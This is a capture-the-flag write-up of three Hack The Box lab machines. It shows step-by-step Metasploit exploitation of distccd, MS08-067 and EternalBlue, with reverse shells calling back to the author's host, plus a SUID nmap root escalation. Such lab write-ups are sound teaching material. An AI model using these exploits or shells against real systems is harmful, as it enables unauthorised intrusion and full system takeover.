---
title: HTB Writeups - LAME, LEGACY, BLUE
published: true
---

A 3-for-1!

These three machines were too short or easy to really warrant a full writeup by themselves, so I've compounded them into this post. Let's get started!

### [](#header-3)LAME

The most obvious way to complete this box seems to be with an SMB exploit, but I initially went a different way that I'll go through here.

We start with a more exhaustive `nmap` scan to find open ports:

<pre>
<kw>root@kali:~</kw># nmap -sV -p1-65535 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org )
Nmap scan report for 10.10.10.3
Host is up (0.080s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
</pre>

And now another scan, concentrating on those open ports, to get detailed version information:

<pre>
<kw>root@kali:~</kw># nmap -sV --version-light -p21,22,139,445,3632 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) 
Nmap scan report for 10.10.10.3
Host is up (0.049s latency).
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

distccd is a service that allows for distributed compilation over several machines - but versions before 2.16 have a [remote code execution vulnerability](https://www.cvedetails.com/cve/CVE-2004-0601/). There's a metasploit module we can use to take advantage of this. We'll start `msfconsole`:

<pre>
<kw>msf5 ></kw> use exploit/unix/misc/distcc_exec 
<kw>msf5 exploit(unix/misc/distcc_exec) ></kw> set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
<kw>msf5 exploit(unix/misc/distcc_exec) ></kw> set RPORT 3632
RPORT => 3632
<kw>msf5 exploit(unix/misc/distcc_exec) ></kw> exploit
[*] Started reverse TCP double handler on 10.10.14.51:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo o9TguQKChBhEyHVo;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "o9TguQKChBhEyHVo\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.51:4444 -> 10.10.10.3:58496) 
</pre>

Now we have a basic shell on the remote machine, we can gather some information and grab the user flag.

<pre>
<kw>$</kw> whoami & hostname & pwd
daemon
lame
/tmp
<kw>$</kw> cd /home/ && ls
ftp
makis
service
user
<kw>$</kw> ls makis
user.txt
<kw>$</kw> cat makis/user.txt
</pre>

We don't yet have access to /root/, however, so we need to escalate our privileges.

Let's check which programs have the ability to set our UID to the owner's, with the following command:

`find / -perm -u=s -type f 2>/dev/null`

`/` says to search everything in the root directory,

`-perm -u=s` specifies that we should only match files that have SUID permissions,

`-type f` will match just regular files, and

`2>/dev/null` directs all stderr (like files that aren't matches) to /dev/null, discarding it. Here's the output:

<pre>
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
</pre>

Most of the programs here are builtins, and thus unlikely to be easy targets - but `nmap` isn't.

Who is the owner, and are we able to execute it?

<pre>
<kw>$</kw> ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap 
</pre>

What version is it?

<pre>
<kw>$</kw> nmap --version
Nmap version 4.53 ( http://insecure.org )
</pre>

As it turns out, old versions of `nmap` allowed users to execute commands via an interactive mode. We can use this mode to spawn a shell with the same privileges as the owner of the program, in this case root.

<pre>
<kw>$</kw> nmap --interactive
Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h &lt;enter&gt; for help
<kw>nmap></kw> !sh
<kw>$</kw> whoami
root
<kw>$</kw> cat /root/root.txt
</pre>

### [](#header-3)LEGACY

As usual, we start with an nmap scan:

<pre>
<kw>root@kali:~</kw># nmap -sV 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org )
Nmap scan report for 10.10.10.4
Host is up (0.087s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
</pre>

It's fairly clear that we're going to be exploiting SMB. We can use a metasploit module to get detailed information about the host:

<pre>
<kw>msf5 ></kw> use auxiliary/scanner/smb/smb_version 
<kw>msf5 auxiliary(scanner/smb/smb_version) ></kw> set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
<kw>msf5 auxiliary(scanner/smb/smb_version) ></kw> run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB )
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</pre>

Now we know the machine is running XP SP3, we can narrow down the list of suitable exploits to use against the service:

<pre>
<kw>msf5 auxiliary(scanner/smb/smb_version) ></kw> search path:exploit/windows/smb sp3
</pre>

Having chosen one, configure the parameters and execute:

<pre>
<kw>msf5 auxiliary(scanner/smb/smb_version) ></kw> use exploit/windows/smb/ms08_067_netapi
<kw>msf5 exploit(windows/smb/ms08_067_netapi) ></kw> set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
<kw>msf5 exploit(windows/smb/ms08_067_netapi) ></kw> exploit
[*] Started reverse TCP handler on 10.10.14.51:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.10.10.4
[&#42;] Meterpreter session 1 opened (10.10.14.51:4444 -> 10.10.10.4:1032) at 2019-09-01 11:13:54 -0400
<kw>meterpreter ></kw>
</pre>

We have a meterpreter shell!

<pre>
<kw>meterpreter ></kw> getuid
Server username: NT AUTHORITY\SYSTEM
<kw>meterpreter ></kw> pwd
C:\WINDOWS\system32
</pre>

The exploit spawned our shell with SYSTEM privileges, so we're done here.

<pre>
<kw>meterpreter ></kw> cat /Documents\ and\ Settings/Administrator/Desktop/root.txt
<kw>meterpreter ></kw> cat /Documents\ and\ Settings/john/Desktop/user.txt
</pre>

### [](#header-3) BLUE

You know the drill - `nmap` time:

<pre>
<kw>root@kali:~</kw># nmap -sV 10.10.10.40
Starting Nmap 7.70 ( https://nmap.org )
Nmap scan report for 10.10.10.40
Host is up (0.20s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
</pre>

And... it's another SMB exploit.

This time, we know the box is running at least Windows 7, so the previous exploit won't do. However, this box is vulnerable to the infamous [EternalBlue](https://www.cvedetails.com/cve/CVE-2017-0144/) exploit, used in the WannaCry ransomware attack. There are a few metasploit modules for this, so let's start up `msfconsole` and get this writeup over with :)

<pre>
<kw>msf5 ></kw> use exploit/windows/smb/ms17_010_eternalblue
<kw>msf5 exploit(windows/smb/ms17_010_eternalblue) ></kw> set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
<kw>msf5 exploit(windows/smb/ms17_010_eternalblue) ></kw> exploit
[*] Started reverse TCP handler on 10.10.14.51:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.51:4444 -> 10.10.10.40:49159) at 2019-09-01 11:57:44 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[&#42;] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

<kw>C:\Windows\system32></kw> whoami
nt authority\system
</pre>

Finally, let's get the user and root flags.

<pre>
<kw>C:\Windows\System32></kw> more \Users\Administrator\Desktop\root.txt
<kw>C:\Windows\System32></kw> more \Users\haris\Desktop\user.txt
</pre>

That's all three rooted! Thanks for reading, some more interesting ones coming soon...

- <kw>j4ckdaw</kw>
